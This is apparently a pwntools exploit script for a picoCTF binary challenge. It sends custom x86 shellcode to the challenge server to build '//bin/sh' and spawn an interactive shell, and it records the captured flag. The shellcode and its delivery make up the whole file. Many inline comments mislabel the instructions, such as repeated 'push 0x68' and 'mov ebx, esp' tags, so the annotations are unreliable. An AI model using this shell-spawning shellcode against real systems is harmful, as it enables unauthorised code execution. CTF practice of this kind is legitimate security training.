from pwn import *


local_bin = "./fun"
elf = ELF(local_bin)
rop = ROP(elf)

p = remote("mercury.picoctf.net", 37853)
#p = process(local_bin)

#p = gdb.debug(local_bin, '''
	#break main
	#break *main+195
	#break *main+123
	#break *execute+211
	#continue
	#''')

'''
#picoCTF{th4t_w4s_fun_edd8e0b87b2038ea}

The first 8 bytes will be used to intercept every 2 bytes later on.

So shellcode will look something like:
XX XX 90 90 XX XX 90 90 

Therefore our shellcode only can be 2 bytes long

We make use of push {value_we_want}, pop dword[ebx] to form //bin/sh

The rest is easy


'''

output = p.recvuntil(b'run')

#this 4 bytes should be useless, lets just do push pop
shellcode = b'\x90' * 4

#this also push pop
shellcode += b'\x90' * 4

shellcode += b'\x89\xe3'	#pop rbx

shellcode += b'\x6a\x2f'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x2f'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x62'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x69'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x6e'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x2f'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x73'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x6a\x68'	#push 0x68
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x31\xc0'	#xor eax, eax
shellcode += b'\x50\x90'	#push eax; push eax
shellcode += b'\x8f\x03'	#pop dword rbx
shellcode += b'\x43\x90'	#inc ebx

shellcode += b'\x89\xe3'	#mov ebx, esp
shellcode += b'\x31\xc9'	#mov ebx, esp
shellcode += b'\x31\xd2'	#mov ebx, esp
shellcode += b'\xb0\x0b'	#mov ebx, esp
shellcode += b'\xcd\x80'	#mov ebx, esp



shellcode += b'\x90\x90'

p.sendline(shellcode)

p.interactive()